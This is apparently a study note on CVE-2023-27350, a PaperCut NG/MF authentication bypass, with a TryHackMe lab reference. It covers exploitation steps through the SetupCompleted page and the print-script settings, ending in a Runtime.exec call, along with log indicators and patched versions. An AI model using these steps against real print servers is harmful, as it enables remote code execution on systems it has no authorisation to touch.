# CVE-2023-27350


CVE-2023-27350 is an authentication bypass vulnerability (**also weaponized as a zero-click exploit**) in the PaperCut NG/MF application. PaperCut NG and MF two options in selg hosting print management:
- PaperCut NG: print management and control solution
- PaperCut MF: is NG with extended copy and scan functionalities

It used for full RCE and can dump information, but stems from the authentication bypass

Zero Day Initiative [ZDI-23-233](https://www.zerodayinitiative.com/advisories/ZDI-23-233/)


There is a [OWASP: Session Puzzling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling) flaw (session and authentication function are used for multiple purposes) within the `SetupCompleted` class
```java
// This Java request below:
// <request> -> SetupCompeted class -> includes a call performLogin(Admin); YES Admin as a LoginType argument.. by hardcoded default mindboggling... 
homePage.performLogin(setupData.getAdminUserName(), LoginType.Admin, false);

```

Browser to 
```bash
http://$domainOrIp/app?service=page/SetupCompleted
```
0. Click on **`Login`**
1. Click on `Printers`.
2. Click on `Template printer`
3. Click on `Scripting`.
4. Check `Enable print script`.


```java
java.lang.Runtime.getRuntime().exec('');

```

Automated public exploit available: [GitHub - Horizon3AI Public exploit](https://github.com/horizon3ai/CVE-2023-27350)

#### Detection

For report writing check `[app-path]/server/logs/*.*`

- Maybe compromised if PaperCut server is configured to log in debug mode
... 
- User "admin" updated the config key "print.script.sandboxed"
- User "admin" updated the config key "device.script.sandboxed"
- User "admin" updated the config key "print-and-device.script.enabled"
- Admin user "admin" modified the print script on the printer
- User/Group Sync settings changed by "admin"

#### Mitigation

- The vulnerability demonstrated has been fixed in versions **20.1.7, 21.2.11, and 22.0.9**
## Reference

[ZDI-23-233](https://www.zerodayinitiative.com/advisories/ZDI-23-233/)
[OWASP: Session Puzzling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling) 
[GitHub - Horizon3AI Public exploit](https://github.com/horizon3ai/CVE-2023-27350)
[THM Papercut](https://tryhackme.com/room/papercut)
